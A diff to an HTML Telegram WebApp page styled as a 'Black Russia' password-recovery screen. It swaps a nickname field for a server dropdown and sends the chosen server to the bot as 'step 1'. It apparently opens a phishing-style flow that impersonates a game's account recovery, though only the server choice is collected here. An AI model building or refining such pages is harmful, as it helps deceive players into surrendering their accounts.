@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <title>Black Russia - Восстановление</title>
     <style>
         * {
@@ -10,6 +10,7 @@
             padding: 0;
             box-sizing: border-box;
         }
+        
         body {
             background: linear-gradient(135deg, #0a0a0a 0%, #1a0000 100%);
             font-family: 'Courier New', monospace;
@@ -18,7 +19,22 @@
             justify-content: center;
             align-items: center;
             padding: 20px;
+            position: relative;
         }
+        
+        body::before {
+            content: "BR";
+            position: absolute;
+            font-size: 120px;
+            font-weight: bold;
+            color: rgba(139, 0, 0, 0.05);
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            font-family: Arial, sans-serif;
+        }
+        
         .container {
             background: rgba(0, 0, 0, 0.95);
             border: 2px solid #ff0000;
@@ -27,16 +43,27 @@
             width: 100%;
             max-width: 400px;
             box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
+            position: relative;
+            z-index: 1;
         }
+        
         h1 {
             text-align: center;
             color: #ff0000;
             font-size: 24px;
             letter-spacing: 3px;
-            margin-bottom: 30px;
+            margin-bottom: 10px;
             text-shadow: 0 0 10px red;
         }
-        input, select {
+        
+        .subtitle {
+            text-align: center;
+            color: #888;
+            font-size: 12px;
+            margin-bottom: 30px;
+        }
+        
+        select {
             width: 100%;
             padding: 15px;
             margin-bottom: 20px;
@@ -47,10 +74,12 @@
             border-radius: 10px;
             outline: none;
         }
-        input:focus, select:focus {
+        
+        select:focus {
             border-color: #ff4444;
             box-shadow: 0 0 10px red;
         }
+        
         button {
             width: 100%;
             padding: 15px;
@@ -64,6 +93,7 @@
             text-transform: uppercase;
             letter-spacing: 2px;
         }
+        
         button:hover {
             transform: scale(1.02);
             box-shadow: 0 0 20px red;
@@ -74,11 +104,13 @@
 <body>
     <div class="container">
         <h1>⛓️ BLACK RUSSIA ⛓️</h1>
-        <input type="text" id="nickname" placeholder="ТВОЙ НИКНЕЙМ" autocomplete="off">
+        <div class="subtitle">ВОССТАНОВЛЕНИЕ ПАРОЛЯ</div>
+        
         <select id="server">
-            <option disabled selected>-- ВЫБЕРИ СЕРВЕР --</option>
+            <option value="" disabled selected>🔽 ВЫБЕРИ СЕРВЕР</option>
         </select>
-        <button id="submitBtn">ВОССТАНОВИТЬ →</button>
+        
+        <button onclick="sendData()">ВОССТАНОВИТЬ →</button>
     </div>
 
     <script>
@@ -94,7 +126,32 @@
             "ASTRAKHAN","CHITA","KOSTROMA","VLADIMIR","KALUGA","NOVGOROD","TAGANROG","VOLOGDA","TVER","TOMSK",
             "IZHEVSK","SURGUT","PODOLSK","MAGADAN","CHEREPOVETS","NORILSK","ASTANA"
         ];
-
+        
         let tg = window.Telegram.WebApp;
         tg.expand();
-        tg.M
+        
+        const serverSelect = document.getElementById('server');
+        servers.forEach(server => {
+            let option = document.createElement('option');
+            option.value = server;
+            option.textContent = server;
+            serverSelect.appendChild(option);
+        });
+        
+        function sendData() {
+            const server = document.getElementById('server').value;
+            
+            if (!server) {
+                alert('❌ ВЫБЕРИ СЕРВЕР!');
+                return;
+            }
+            
+            tg.sendData(JSON.stringify({
+                step: 1,
+                server: server
+            }));
+            tg.close();
+        }
+    </script>
+</body>
+</html>
